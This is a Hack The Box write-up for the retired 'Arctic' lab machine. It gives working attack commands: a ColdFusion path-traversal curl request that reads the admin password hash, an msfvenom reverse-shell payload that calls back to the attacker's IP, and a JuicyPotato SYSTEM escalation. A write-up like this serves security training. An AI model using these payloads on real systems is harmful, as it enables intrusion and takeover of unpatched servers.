---
machine: Arctic
platform: Hack The Box
category: Windows
difficulty: Easy
points: 20
tags: [coldfusion, cve-2009-2265, jsp-shell, churrasco]
date: 2026-01-20
status: retired
summary: "An easy Windows box built around a legacy Adobe ColdFusion application server — exercising service fingerprinting on a non-standard port, research into known web-application vulnerabilities, and offline hash cracking, followed by a classic Windows token-impersonation privilege escalation against an older Server 2008 host."
---
## Enumeration

nmap scan:
```bash
──(kali㉿kali)-[~/htb/arctic]
└─$ nmap -sCV 10.129.33.163 -oN nmapscan                       
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-15 22:18 -0400
Nmap scan report for 10.129.33.163
Host is up (0.036s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  http    JRun Web Server
|_http-title: Index of /
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 140.60 seconds
```

We see an interesting web server on port 8500

When we navigate to it we see two listed directories: `CFIDE/` and `cfdocs/`

When we look up `8500/tcp open http JRun Web Server` we find:
```text
The JRun Web Server running on TCP port 8500 typically indicates an active **Adobe ColdFusion** environment. ColdFusion uses this non-standard port for its built-in server or administrator panel, which often runs alongside primary web servers like IIS or Apache. [](https://community.adobe.com/questions-582/edit-windows-hosts-file-288600)

What This Means

- **Technology:** Adobe ColdFusion / Macromedia JRun.
- **Default Path:** Often hosts the ColdFusion administration panel at `/CFIDE/administrator/`.
```

We can navigate to here and find a login portal for adobe coldfusion 8 administrator

It doesnt seem like there are any default credentials to be tried here, but maybe we can find them in a config file?

```text
For the Adobe (formerly Macromedia) JRun Web Server, there are no universally fixed default credentials for the administrator account. The default username is **`admin`**, but the password is one you specifically defined during the initial JRun installation process. [](https://docs.oracle.com/cd/E05554_01/books/Collab_Admin/Collab_AdminSettingUp5.html)

If the password has been lost, you can recover or reset it locally with the following steps:

1. **Locate Credentials File:** The JRun users and passwords are saved in plain text within the `jrun-users.xml` file.
2. **File Path:** It is typically found in the server directory (e.g., `C:\JRun4\servers\admin\SERVER-INF\jrun-users.xml`).
```

```text
**Directory Traversal / Arbitrary File Read (CVE-2010-2861):** Flaws in the administrator portal components let attackers read sensitive system files (e.g., configuration files containing usernames and database passwords) without requiring administrative credentials.
```

```text
CVE-2010-2861 is a directory traversal vulnerability in Adobe ColdFusion (versions 8.x and 9.x) that allows unauthenticated attackers to read arbitrary files (like `password.properties` or `neo-security.xml`). Attackers typically read these files to harvest the admin password hash and salt, bypassing authentication to gain full Remote Code Execution
```

Doing research on the Adobe Cold Fusion 8 portal has introduced us to a CVE which may allow us to read some sensitive password-containing files without auth

We find a PoC for it in exploitdb https://www.exploit-db.com/exploits/14641

I see the important part of this exploit is the path traversal, so I just append it to my url and curl it

```bash
┌──(kali㉿kali)-[~/htb/arctic]
└─$ curl http://10.129.33.163:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
```

We see this blob pop up a few times:
```text
#Wed Mar 22 20:53:51 EET 2017
rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true
```

From my research on this I believe its a sha1 hash

This article https://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/ says you should be able to "pass" it and sign in as admin without cracking the hash but after trying the exploit as detailed several times I couldn't get it to work

So I just crack the Sha1 hash

`2f635f6d20e3fde0c53075a84b68fb07dcec9b03:happyday`

So now we can get access to the admin portal

## Foothold

After toying around I think its theoretically possible to get a rev .jsp shell from making a scheduled task which points at your python http server which is hosting a reverse shell and telling it to get it and store it in CFIDE where I should be able to hit its endpoint from my client to execute it.

![[Pasted image 20260515223427.png]]

For some reason my file was being served "when save to output" was unchecked but when checked the task never ran/fetched anymore.  I'm unsure if this is due to a methodology error or a security implementation.

**Disclaimer: This foothold path is NOT the intended exploitation path by the box authors, its actually recommended to gain unauthenticated RCE via CVE-2009-2265, I just chose the wrong CVE**

After adding my local and remote host information into the RCE PoC, I got remote code execution and a foothold on the machine:

```text
C:\ColdFusion8\runtime\bin>whoami
whoami
arctic\tolis
```

We can get the user flag from the desktop at this point

## Privilege Escalation

We check privs and see we have `SeImpersonatePrivilege` - I believe these are frequently used for potato attacks

```text
C:\Users\tolis\Desktop>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

```

I think I'm going to explore exploiting this `SeImpersonatePrivilege` priv which often means potato attack, I run system info to get the OS name and version to look up which potato would likely be best for it as I'm not deeply familiar with this exploit family yet.

```text
OS Name:                   Microsoft Windows Server 2008 R2 Standard 
OS Version:                6.1.7600 N/A Build 7600
```

I transfer over [Juicy Potato] or `jp.exe` where JuicyPotato can be downloaded at `wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -O /tmp/jp.exe` and make a reverse shell with msfvenom (I originally tried this with a powershell revshell and it did not work so I would recommend just crafting a reverse tcp shell with msfvenom) with `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.144 LPORT=9999 -f exe -o shell.exe`

When performing potato attacks the goal is to target the right CLSID.  JuicyPotato has a github list you can refer to while trying to find which ones to use: `https://github.com/ohpe/juicy-potato/tree/master/CLSID`.  You typically filter by your OS first and then go down the list until your potato attack shows `authresult 0` meaning the SYSTEM token grab was successful, if you have your listener up at that time it should pop (in theory).

```text
C:\Users\tolis\Music>jp.exe -l 2000 -p C:\Users\tolis\Music\shell.exe -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
jp.exe -l 2000 -p C:\Users\tolis\Music\shell.exe -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
Testing {9B1F122C-2982-4e91-AA8B-E071D54F2A4D} 2000
....
[+] authresult 0
{9B1F122C-2982-4e91-AA8B-E071D54F2A4D};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

C:\Users\tolis\Music>

──(kali㉿kali)-[~/htb/arctic]
└─$ nc -nlvp 2000
listening on [any] 2000 ...
connect to [10.10.15.144] from (UNKNOWN) [10.129.33.163] 49758
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

From here we just get the administrator flag from the desktop!
